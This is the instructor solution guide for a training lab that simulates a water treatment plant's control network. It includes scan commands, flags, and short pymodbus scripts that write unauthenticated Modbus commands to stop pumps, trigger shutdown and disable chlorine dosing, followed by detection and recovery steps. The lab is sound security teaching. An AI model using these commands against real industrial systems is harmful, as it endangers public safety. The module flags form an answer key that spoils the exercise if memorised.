# OT Water Treatment Lab: Instructor Guide
## AquaShield Security Assessment — Solutions and Setup

---

## Setup Instructions

### Quick Start

```bash
cd ot-water-treatment
docker-compose up --build -d
```

Wait 60 seconds for the Modbus simulation to initialize, then verify:
- SCADA Dashboard: http://localhost:3000
- Scoring Server: http://localhost:5000
- Wireshark: http://localhost:3001

### Running for Multiple Students

Each student runs their own isolated stack on their own machine. No shared server required. Each student's scoring is tracked locally on their own instance.

To run a classroom competition, project a shared Google Sheet or whiteboard. When a student completes a challenge, verify their screen and add points manually.

---

## Module Solutions

### Module 1: Network Recon (100 pts, Easy)

**Question:** Find the IP address of the PLC on the OT network.

**Solution:**
```bash
nmap -sT -p 502 172.28.0.0/24
```

**Flag:** `172.28.0.10`

**What students learn:** Basic network scanning, understanding that Modbus runs on port 502.

---

### Module 2: Protocol Identification (100 pts, Easy)

**Question:** What is the Modbus function code for "Read Holding Registers"?

**Solution:** This is a knowledge-based question. Students should research Modbus TCP function codes.

**Flag:** `3`

**What students learn:** The Modbus protocol specification, how function codes map to operations.

---

### Module 3: Register Mapping (150 pts, Medium)

**Question:** Read the holding registers of the PLC and find the hidden marker value.

**Solution:**
```bash
python3 /tools/scripts/read_registers.py
```

**Flag:** `31337`

**What students learn:** How to use pymodbus to read PLC memory, understanding the register address space.

---

### Module 4: Pump Manipulation (200 pts, Medium)

**Question:** Write a value to the PLC's pump speed register and observe the flow anomaly on the SCADA dashboard. How many alarms are triggered?

**Solution:**
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.28.0.10')
c.connect()
c.write_register(0, 99)
```

**Flag:** `5`

**What students learn:** Writing to PLC registers without authentication, observing physical consequences.

---

### Module 5: Emergency Shutdown (200 pts, Medium)

**Question:** Trigger the emergency shutdown coil. What is the pump speed value after shutdown?

**Solution:**
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.28.0.10')
c.connect()
c.write_coil(4, True)
```

**Flag:** `99`

**What students learn:** Writing to Modbus coils (boolean ON/OFF switches), understanding safety-critical controls.

---

### Module 6: Chemical Dosing Sabotage (250 pts, Hard)

**Question:** Disable the chlorine dosing pump by turning off its coil. What is the chlorine level after 30 seconds?

**Solution:**
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.28.0.10')
c.connect()
c.write_coil(3, False)
```

**Flag:** `2`

**What students learn:** The physical safety implications of disabling chemical treatment in a water plant.

---

### Module 7: Stealthy Register Tampering (250 pts, Hard)

**Question:** What is the Modbus function code for "Write Single Register"?

**Solution:** Another knowledge-based question requiring students to understand how the write command they used in Module 4 actually works at the protocol level.

**Flag:** `0x06`

**What students learn:** Deep protocol understanding, connecting their Python commands to raw Modbus frames visible in Wireshark.

---

### Module 8: Intrusion Detection - Coils (200 pts, Hard)

**Question:** How many coils have been modified from their default state?

**Solution:** Students read all coils using pymodbus and compare against expected defaults.

**Flag:** `2`

**What students learn:** Forensic analysis of PLC state, understanding baseline vs compromised state.

---

### Module 9: Intrusion Detection - Registers (200 pts, Hard)

**Question:** How many registers have been modified from their default state?

**Solution:** Students read all registers and identify anomalous values.

**Flag:** `7`

**What students learn:** OT incident detection, identifying tampered values in industrial systems.

---

### Module 10: Incident Response (350 pts, Expert)

**Question:** Restore the plant to safe operating conditions. Submit the final state as: emergency_coil_pump_speed_chlorine_setpoint.

**Solution:**
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.28.0.10')
c.connect()
c.write_coil(4, False)       # Clear emergency shutdown
c.write_coil(0, True)        # Enable intake pump
c.write_coil(1, True)        # Enable treatment pump
c.write_coil(2, True)        # Enable distribution pump
c.write_coil(3, True)        # Enable chlorine dosing
c.write_register(0, 45)      # Set pump speed to safe level
c.write_register(5, 40)      # Set chlorine setpoint
```

**Flag:** `0_45_40`

**What students learn:** OT incident response procedures, restoring a compromised plant to safe operation.

---

## Grading Rubric

| Module | Points |
|--------|--------|
| Module 1: Network Recon | 100 |
| Module 2: Protocol ID | 100 |
| Module 3: Register Mapping | 150 |
| Module 4: Pump Manipulation | 200 |
| Module 5: Emergency Shutdown | 200 |
| Module 6: Chemical Sabotage | 250 |
| Module 7: Stealthy Tampering | 250 |
| Module 8: Intrusion Detection (Coils) | 200 |
| Module 9: Intrusion Detection (Registers) | 200 |
| Module 10: Incident Response | 350 |
| **Total** | **2,000** |

---

## Common Student Issues

| Problem | Solution |
|---------|----------|
| "nmap not found" | Rebuild student container: `docker-compose build student-env` |
| "pymodbus not installed" | It's pre-installed. Make sure they're inside the container: `docker exec -it lab-ot-water-student bash` |
| "Can't connect to PLC" | Check containers are running: `docker ps` |
| SCADA dashboard not loading | Run `docker restart lab-ot-water-scada` |
| Wireshark not loading | The image is large (~500MB), wait for the pull to complete |
| Student broke the plant completely | Run `docker-compose down -v && docker-compose up --build -d` |
